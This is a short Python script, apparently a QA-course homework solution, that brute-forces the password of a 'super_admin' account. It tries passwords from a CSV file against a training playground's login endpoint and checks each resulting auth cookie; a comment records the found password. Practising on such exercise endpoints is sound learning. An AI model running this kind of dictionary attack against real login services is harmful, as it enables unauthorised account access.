import requests

URL_AUTH = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_COOKIE = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"

with open("passwords.csv") as file:
    readline = file.read().splitlines()
passwords = set(readline)

for p in passwords:
    payload = dict(login=login, password=p)
    res_auth = requests.post(URL_AUTH, data=payload)
    cookie = dict(res_auth.cookies)["auth_cookie"]
    res_cookie = requests.post(URL_COOKIE, cookies=dict(auth_cookie=cookie))
    if res_cookie.text != "You are NOT authorized":
        print(f"Found password: {p}")
        print(res_cookie.text)
        break

#Найден пароль: welcome